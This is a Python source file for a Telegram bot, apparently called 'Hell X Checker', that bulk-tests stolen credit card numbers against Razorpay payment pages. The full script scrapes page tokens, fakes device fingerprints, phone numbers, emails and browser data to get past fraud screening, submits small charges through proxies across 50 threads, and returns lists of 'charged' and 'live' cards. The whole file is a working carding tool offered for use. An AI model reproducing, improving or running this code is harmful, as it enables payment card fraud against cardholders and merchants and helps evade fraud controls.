# Python | bot.py | Python 3.10+ | Target: Telegram CC checker bot (Razorpay)
# Requires: TELEGRAM_TOKEN env var; optional RZP_PAGE_URL, PROXY_URL

import os, re, json, time, hashlib, secrets, string, base64, random, threading
import requests, urllib3
from urllib.parse import quote
from faker import Faker
from fake_useragent import UserAgent
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    ContextTypes, filters, CallbackQueryHandler
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

fake    = Faker()
BOT_TOKEN   = os.getenv("TELEGRAM_TOKEN", "")
RZP_URL     = os.getenv("RZP_PAGE_URL", "https://pages.razorpay.com/myglobalhost")
PROXY_URL   = os.getenv("PROXY_URL", "")
ALLOWED_IDS = set(os.getenv("ALLOWED_IDS", "").split(",")) - {""}  # comma-sep user IDs; empty = open

AMO         = int(os.getenv("AMOUNT_INR", "1"))
AMO_PAISE   = AMO * 100
MAX_THREADS = 50
SESSION_RETRIES = 2

BUILD_FALLBACK    = "9cb57fdf457e44eac4384e182f925070ff5488d9"
BUILD_V1_FALLBACK = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"

# per-chat state: {chat_id: {"running": bool, "stats": dict, "results": list}}
state_lock = threading.Lock()
chat_state: dict = {}


# ── helpers ──────────────────────────────────────────────────────────────────

def allowed(update: Update) -> bool:
    if not ALLOWED_IDS:
        return True
    return str(update.effective_user.id) in ALLOWED_IDS


def init_state(chat_id):
    with state_lock:
        chat_state[chat_id] = {
            "running": False,
            "stats": {"charged": 0, "live": 0, "ccn": 0, "dead": 0, "error": 0, "total": 0},
            "results": [],
        }


def get_state(chat_id):
    with state_lock:
        return chat_state.get(chat_id)


def parse_proxy(p):
    if not p:
        return None
    if p.count(':') == 3 and '@' not in p:
        sp = p.split(':')
        if sp[1].isdigit():
            ip, port, user, pwd = sp
        else:
            user, pwd, ip, port = sp
        p = f"http://{user}:{pwd}@{ip}:{port}"
    elif '@' in p and '://' not in p:
        p = 'http://' + p
    elif p.count(':') == 1 and '://' not in p:
        p = 'http://' + p
    return {"http": p, "https": p}


def card_brand(n):
    if n.startswith("4"):                                       return "visa"
    elif n[:2] in ("51","52","53","54","55"):                   return "mastercard"
    elif n[:2] in ("34","37"):                                  return "amex"
    elif n.startswith("6011") or n.startswith("65"):            return "discover"
    elif n.startswith("35"):                                    return "jcb"
    elif n.startswith("62"):                                    return "unionpay"
    return "unknown"


def find_between(text, s, e):
    try:
        i = text.index(s) + len(s)
        return text[i:text.index(e, i)]
    except ValueError:
        return ""


def extract_builds(text):
    hashes = re.findall(r'build[_v1]*=([a-f0-9]{40})', text)
    if len(hashes) >= 2: return hashes[0], hashes[1]
    if len(hashes) == 1: return hashes[0], BUILD_V1_FALLBACK
    return BUILD_FALLBACK, BUILD_V1_FALLBACK


def gen_phone():
    return "+91" + random.choice(['6','7','8','9']) + ''.join(str(random.randint(0,9)) for _ in range(9))


def fmt_stats(s):
    return (
        f"✅ Charged: {s['charged']}\n"
        f"🟢 Live: {s['live']}\n"
        f"🔵 CCN: {s['ccn']}\n"
        f"❌ Dead: {s['dead']}\n"
        f"⚠️ Error: {s['error']}\n"
        f"📦 Total: {s['total']}"
    )


# ── core checker ──────────────────────────────────────────────────────────────

def check_cc(cc_data: str, proxy_url: str) -> dict:
    """Returns dict: status, card, msg"""
    if "|" not in cc_data:
        return {"status": "error", "card": cc_data, "msg": "bad format"}

    session = requests.Session()
    session.verify = False
    if proxy_url:
        p = parse_proxy(proxy_url)
        if p: session.proxies.update(p)

    try:
        parts = cc_data.split("|")
        cc  = parts[0].strip()
        mm  = parts[1].strip().zfill(2)
        yy  = parts[2].strip()[-2:]
        cvv = parts[3].strip()
        year = int("20" + yy)

        brand = card_brand(cc)
        h     = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
        ts    = str(int(time.time() * 1000))
        rnd   = str(random.randrange(10**8)).zfill(8)
        dev_id = f"1.{h}.{ts}.{rnd}"
        BASE62 = string.ascii_letters + string.digits
        sess_uid = ''.join(secrets.choice(BASE62) for _ in range(14))
        ua     = UserAgent().chrome
        phone  = gen_phone()
        phone_short = phone[3:]
        email  = fake.user_name() + "@gmail.com"

        # step 1 — page
        r = session.get(RZP_URL, timeout=30)
        m = re.search(r'var data = ({.*?});', r.text, re.DOTALL)
        if not m: return {"status": "error", "card": cc_data, "msg": "page parse fail"}
        d      = json.loads(m.group(1))
        kyid   = d["key_id"]
        plink  = d["payment_link"]["id"]
        ppid   = d["payment_link"]["payment_page_items"][0]["id"]
        kh     = d.get("keyless_header", "")
        kh_url = quote(kh.encode(), safe='')

        # step 2 — order
        r2 = session.post(
            f"https://api.razorpay.com/v1/payment_pages/{plink}/order",
            headers={'Accept':'application/json','Content-Type':'application/json',
                     'Origin':'https://pages.razorpay.com','User-Agent':ua},
            json={'notes':{'comment':'','name':'Hell King'},
                  'line_items':[{'payment_page_item_id':ppid,'amount':AMO_PAISE}]},
            timeout=30
        )
        od = json.loads(r2.text)
        order_id    = od["order"]["id"]
        checkout_id = order_id.split("_")[1]

        # step 3 — public (dynamic BUILD + session token, with retry)
        sessid = ""
        BUILD, BUILD_V1 = BUILD_FALLBACK, BUILD_V1_FALLBACK
        for _ in range(SESSION_RETRIES):
            rp = session.get(
                'https://api.razorpay.com/v1/checkout/public',
                params={'traffic_env':'production','checkout_v2':'1','new_session':'1',
                        'keyless_header':kh,'rzp_device_id':dev_id,'unified_session_id':sess_uid},
                headers={'Accept':'text/html,*/*','Referer':'https://pages.razorpay.com/','User-Agent':ua},
                timeout=30
            )
            BUILD, BUILD_V1 = extract_builds(rp.text)
            sessid = find_between(rp.text, 'window.session_token="', '";')
            if not sessid:
                mx = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', rp.text)
                if mx: sessid = mx.group(1)
            if sessid: break
            time.sleep(0.5)

        if not sessid:
            return {"status": "error", "card": cc_data, "msg": "session_token fail"}

        ref = (f"https://api.razorpay.com/v1/checkout/public?traffic_env=production"
               f"&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1"
               f"&unified_session_id={sess_uid}&session_token={sessid}")

        hdrs = lambda extra={}: {
            'Accept':'*/*','Content-type':'application/json',
            'Origin':'https://api.razorpay.com','Referer':ref,
            'User-Agent':ua,'x-session-token':sessid, **extra
        }
        params_base = {'x_entity_id':order_id,'session_token':sessid,'keyless_header':kh}

        # step 4 — preferences
        session.post('https://api.razorpay.com/v2/standard_checkout/preferences',
            params=params_base, headers=hdrs(),
            data=json.dumps({
                'query':[{'resource':r} for r in ['checkout_version_config','merchant','merchant_features',
                    'downtime','customer','customer_tokens','truecaller','methods','experiments',
                    'offers','checkout_config','order','invoice','buyer_protection','personalization']],
                'query_params':{'device_id':dev_id,'rtb_device_id':h,'amount':AMO_PAISE,
                    'currency':'INR','option_currency':'INR','truecaller':False,'qr_required':False,
                    'library':'checkoutjs','platform':'browser','order_id':order_id,
                    'payment_link_id':plink,'contact':phone},
                'action':'get'}), timeout=30)

        # step 5 — checkout/order
        hdrs_form = lambda: {**hdrs(), 'Content-type':'application/x-www-form-urlencoded'}
        co_data = {
            'notes[email]':email,'notes[phone]':phone_short,'payment_link_id':plink,
            'key_id':kyid,'contact':phone,'email':email,'currency':'INR',
            '_[integration]':'payment_pages','_[device.id]':dev_id,'_[library]':'checkoutjs',
            '_[library_src]':'no-src','_[current_script_src]':'no-src','_[platform]':'browser',
            '_[env]':'','_[is_magic_script]':'false','_[os]':'windows',
            '_[shield][fhash]':h,'_[shield][tz]':'0','_[device_id]':dev_id,'_[build]':BUILD,
            '_[shield][os]':'windows','_[shield][platform]':'browser','_[shield][browser]':'chrome',
            '_[request_index]':'0','amount':AMO_PAISE,'order_id':order_id,'method':'card','checkout_id':checkout_id,
        }
        rco = session.post('https://api.razorpay.com/v1/standard_checkout/checkout/order',
            params={'key_id':kyid,'session_token':sessid,'keyless_header':kh},
            headers=hdrs_form(), data=co_data, timeout=30)
        try: coid = json.loads(rco.text).get("checkout_id", checkout_id)
        except: coid = checkout_id

        # step 6 — cb flows
        session.post(
            f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows"
            f"?x_entity_id={order_id}&keyless_header={kh_url}",
            headers=hdrs(), json={
                'identifiers':{'merchant':{'country':'IN'},
                    'card':{'country':'US','dcc_blacklist':False,'network':brand},
                    'method':'card','payment_currency':'INR'},
                'forex_charges':{'amount':AMO_PAISE,'currency':'INR','filters':{'method':'card'}}},
            timeout=30)

        # step 7 — create payment
        tok = base64.b64encode(json.dumps([{"name":"sardine","metadata":{"session_id":coid}}],
                                          separators=(',',':')).encode()).decode()
        cr_data = {
            'user_risk_providers_token':tok,'notes[comment]':'','notes[email]':email,
            'notes[phone]':phone_short,'notes[name]':'Hell king','payment_link_id':plink,
            'key_id':kyid,'contact':phone,'email':email,'currency':'INR',
            '_[integration]':'payment_pages','_[checkout_id]':coid,'_[device.id]':dev_id,
            '_[env]':'','_[library]':'checkoutjs','_[library_src]':'no-src',
            '_[current_script_src]':'no-src','_[is_magic_script]':'false',
            '_[platform]':'browser','_[referer]':RZP_URL,'_[shield][fhash]':h,
            '_[shield][tz]':'-330','_[device_id]':dev_id,'_[build]':BUILD,
            '_[shield][os]':'windows','_[shield][platform]':'browser',
            '_[shield][browser]':'chrome','_[request_index]':'1',
            'amount':AMO_PAISE,'order_id':order_id,'method':'card',
            'card[number]':cc,'card[cvv]':cvv,'card[name]':'Hell King',
            'card[expiry_month]':mm,'card[expiry_year]':year,'save':'0','dcc_currency':'INR',
        }
        rcr = session.post('https://api.razorpay.com/v1/standard_checkout/payments/create/ajax',
            params={'x_entity_id':order_id,'session_token':sessid,'keyless_header':kh},
            headers=hdrs_form(), data=cr_data, allow_redirects=True, timeout=30)

        pj = json.loads(rcr.text)
        pid = pj.get("payment_id") or pj.get("id")
        if not pid:
            return {"status": "dead", "card": cc_data, "msg": "no payment_id"}

        pid_clean = pid.split("_")[1]

        # step 8 — 3DS
        h3 = {'content-type':'application/x-www-form-urlencoded','user-agent':ua}
        session.post(f"https://api.razorpay.com/pg_router/v1/payments/{pid}/authenticate",
                     headers=h3, timeout=30)
        time.sleep(1)
        session.post(f"https://api.razorpay.com/pg_router/v1/payments/{pid_clean}/authenticate",
            headers=h3, data={
                'browser[java_enabled]':'false','browser[javascript_enabled]':'true',
                'browser[timezone_offset]':'0',
                'browser[color_depth]':str(random.choice([24,32])),
                'browser[screen_width]':str(random.choice([1920,1366,1536,1440])),
                'browser[screen_height]':str(random.choice([1080,768,864,900])),
                'browser[language]':'en-US','auth_step':'3ds2Auth'}, timeout=30)

        # step 9 — cancel poll (20s hard timeout)
        rf = (f"https://api.razorpay.com/v1/checkout/public?traffic_env=production"
              f"&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1"
              f"&rzp_device_id={dev_id}&unified_session_id={sess_uid}&session_token={sessid}")
        rfin = session.get(
            f"https://api.razorpay.com/v1/standard_checkout/payments/{pid}/cancel",
            params={'key_id':kyid,'session_token':sessid,'keyless_header':kh},
            headers={'Accept':'*/*','Content-type':'application/x-www-form-urlencoded',
                     'Referer':rf,'User-Agent':ua,'x-session-token':sessid},
            timeout=20)

        fj  = json.loads(rfin.text)
        err = fj.get("error", {})
        desc = err.get("description", "Unknown").replace(
            " Try another payment method or contact your bank for details.", "").replace(
            "Try another payment method or contact your bank for details.", "")
        code = err.get("reason", "N/A")
        ml   = desc.lower()

        if "razorpay_payment_id" in rfin.text:
            return {"status":"charged","card":cc_data,"msg":f"Transaction Success | {fj.get('razorpay_payment_id','N/A')}"}
        elif any(k in ml for k in ["insufficient account balance","maximum transaction limit"]):
            return {"status":"live","card":cc_data,"msg":f"{desc} ({code})"}
        elif "cvv provided is incorrect" in ml or "incorrect_cvv" in ml:
            return {"status":"ccn","card":cc_data,"msg":f"{desc} ({code})"}
        else:
            return {"status":"dead","card":cc_data,"msg":f"{desc} ({code})"}

    except Exception as e:
        return {"status":"error","card":cc_data,"msg":str(e)}


# ── bot handlers ──────────────────────────────────────────────────────────────

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update): return
    await update.message.reply_text(
        "🔥 *Hell X Checker — Razorpay*\n\n"
        "Send a `.txt` file with cards (`cc|mm|yy|cvv`) or paste cards directly.\n\n"
        "Commands:\n"
        "`/check cc|mm|yy|cvv` — single card\n"
        "`/stop` — stop running check\n"
        "`/stats` — current run stats",
        parse_mode="Markdown"
    )


async def cmd_check_single(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update): return
    if not ctx.args:
        await update.message.reply_text("Usage: `/check 4111111111111111|12|26|123`", parse_mode="Markdown")
        return

    card = " ".join(ctx.args).strip()
    msg  = await update.message.reply_text("⏳ Checking...")
    result = check_cc(card, PROXY_URL)
    emoji  = {"charged":"✅","live":"🟢","ccn":"🔵","dead":"❌","error":"⚠️"}.get(result["status"],"❓")
    await msg.edit_text(f"{emoji} `{result['card']}`\n{result['msg']}", parse_mode="Markdown")


async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update): return
    cid = update.effective_chat.id
    s   = get_state(cid)
    if not s:
        await update.message.reply_text("No active session.")
        return
    await update.message.reply_text(fmt_stats(s["stats"]))


async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update): return
    cid = update.effective_chat.id
    with state_lock:
        if cid in chat_state:
            chat_state[cid]["running"] = False
    await update.message.reply_text("🛑 Stop signal sent.")


async def handle_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update): return
    doc = update.message.document
    if not doc or not doc.file_name.endswith(".txt"):
        await update.message.reply_text("Send a `.txt` file with cards.")
        return

    cid = update.effective_chat.id
    s   = get_state(cid)
    if s and s["running"]:
        await update.message.reply_text("Already running. /stop first.")
        return

    init_state(cid)
    status_msg = await update.message.reply_text("📥 Downloading file...")

    file = await ctx.bot.get_file(doc.file_id)
    raw  = await file.download_as_bytearray()
    lines = [l.strip() for l in raw.decode("utf-8", errors="ignore").splitlines() if l.strip()]

    await status_msg.edit_text(f"⏳ Loaded {len(lines)} cards. Starting...")

    with state_lock:
        chat_state[cid]["running"] = True
        chat_state[cid]["stats"]["total"] = len(lines)

    def run_batch():
        sem = threading.Semaphore(MAX_THREADS)
        results_buf = []
        buf_lock    = threading.Lock()
        threads     = []

        def worker(card):
            with sem:
                st = get_state(cid)
                if not st or not st["running"]:
                    return
                r = check_cc(card, PROXY_URL)
                with state_lock:
                    s = chat_state.get(cid)
                    if s:
                        key = r["status"] if r["status"] in ("charged","live","ccn","dead","error") else "error"
                        s["stats"][key] = s["stats"].get(key, 0) + 1
                        s["results"].append(r)
                with buf_lock:
                    results_buf.append(r)

        for card in lines:
            t = threading.Thread(target=worker, args=(card,), daemon=True)
            t.start()
            threads.append(t)
            time.sleep(0.1)

        for t in threads:
            t.join()

        with state_lock:
            if cid in chat_state:
                chat_state[cid]["running"] = False

    import asyncio

    def run_and_notify():
        run_batch()
        # schedule final message on event loop
        asyncio.run_coroutine_threadsafe(send_final(cid, ctx), ctx.application.loop)

    async def send_final(chat_id, ctx):
        s = get_state(chat_id)
        if not s: return
        stats_txt = fmt_stats(s["stats"])

        # build result file
        lines_out = []
        for r in s["results"]:
            emoji = {"charged":"✅","live":"🟢","ccn":"🔵","dead":"❌","error":"⚠️"}.get(r["status"],"❓")
            lines_out.append(f"[{r['status'].upper()}] {r['card']} | {r['msg']}")

        result_bytes = "\n".join(lines_out).encode()
        approved = [l for l in lines_out if l.startswith(("[CHARGED]","[LIVE]","[CCN]"))]
        approved_bytes = "\n".join(approved).encode() if approved else b"none"

        await ctx.bot.send_message(chat_id, f"✅ *Done!*\n\n{stats_txt}", parse_mode="Markdown")

        if approved:
            from io import BytesIO
            await ctx.bot.send_document(chat_id,
                document=BytesIO(approved_bytes),
                filename="approved.txt",
                caption=f"🟢 {len(approved)} approved cards")

        await ctx.bot.send_document(chat_id,
            document=__import__('io').BytesIO(result_bytes),
            filename="results.txt",
            caption="📄 Full results")

    threading.Thread(target=run_and_notify, daemon=True).start()
    await status_msg.edit_text(
        f"🚀 Running {len(lines)} cards...\nUse /stats to check progress or /stop to halt."
    )


async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handle pasted card list directly in chat."""
    if not allowed(update): return
    text  = update.message.text.strip()
    lines = [l.strip() for l in text.splitlines() if "|" in l.strip()]
    if not lines:
        return  # not cards, ignore
    if len(lines) == 1:
        # single card — just check inline
        msg = await update.message.reply_text("⏳ Checking...")
        r   = check_cc(lines[0], PROXY_URL)
        emoji = {"charged":"✅","live":"🟢","ccn":"🔵","dead":"❌","error":"⚠️"}.get(r["status"],"❓")
        await msg.edit_text(f"{emoji} `{r['card']}`\n{r['msg']}", parse_mode="Markdown")
    else:
        # multi — treat as file
        from io import BytesIO
        fake_doc_update = update
        # re-use file handler logic via synthetic doc
        cid = update.effective_chat.id
        s   = get_state(cid)
        if s and s["running"]:
            await update.message.reply_text("Already running. /stop first.")
            return
        init_state(cid)
        with state_lock:
            chat_state[cid]["running"] = True
            chat_state[cid]["stats"]["total"] = len(lines)

        status_msg = await update.message.reply_text(f"⏳ Loaded {len(lines)} cards. Starting...")

        import asyncio

        def run_batch_inline():
            sem = threading.Semaphore(MAX_THREADS)
            threads = []

            def worker(card):
                with sem:
                    st = get_state(cid)
                    if not st or not st["running"]: return
                    r = check_cc(card, PROXY_URL)
                    with state_lock:
                        s = chat_state.get(cid)
                        if s:
                            key = r["status"] if r["status"] in ("charged","live","ccn","dead","error") else "error"
                            s["stats"][key] = s["stats"].get(key, 0) + 1
                            s["results"].append(r)

            for card in lines:
                t = threading.Thread(target=worker, args=(card,), daemon=True)
                t.start()
                threads.append(t)
                time.sleep(0.1)
            for t in threads:
                t.join()
            with state_lock:
                if cid in chat_state:
                    chat_state[cid]["running"] = False

            asyncio.run_coroutine_threadsafe(send_done(cid), ctx.application.loop)

        async def send_done(chat_id):
            s = get_state(chat_id)
            if not s: return
            lines_out = [
                f"[{r['status'].upper()}] {r['card']} | {r['msg']}"
                for r in s["results"]
            ]
            approved = [l for l in lines_out if l.startswith(("[CHARGED]","[LIVE]","[CCN]"))]
            await ctx.bot.send_message(chat_id, f"✅ *Done!*\n\n{fmt_stats(s['stats'])}", parse_mode="Markdown")
            if approved:
                from io import BytesIO
                await ctx.bot.send_document(chat_id,
                    document=BytesIO("\n".join(approved).encode()),
                    filename="approved.txt",
                    caption=f"🟢 {len(approved)} approved")
            await ctx.bot.send_document(chat_id,
                document=__import__('io').BytesIO("\n".join(lines_out).encode()),
                filename="results.txt", caption="📄 Full results")

        threading.Thread(target=run_batch_inline, daemon=True).start()
        await status_msg.edit_text(
            f"🚀 Running {len(lines)} cards...\nUse /stats or /stop."
        )


# ── main ──────────────────────────────────────────────────────────────────────

def main():
    if not BOT_TOKEN:
        raise RuntimeError("TELEGRAM_TOKEN env var not set")

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",  cmd_start))
    app.add_handler(CommandHandler("check",  cmd_check_single))
    app.add_handler(CommandHandler("stats",  cmd_stats))
    app.add_handler(CommandHandler("stop",   cmd_stop))
    app.add_handler(MessageHandler(filters.Document.TXT, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print(f"[BOT] Running | RZP: {RZP_URL} | Threads: {MAX_THREADS}")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
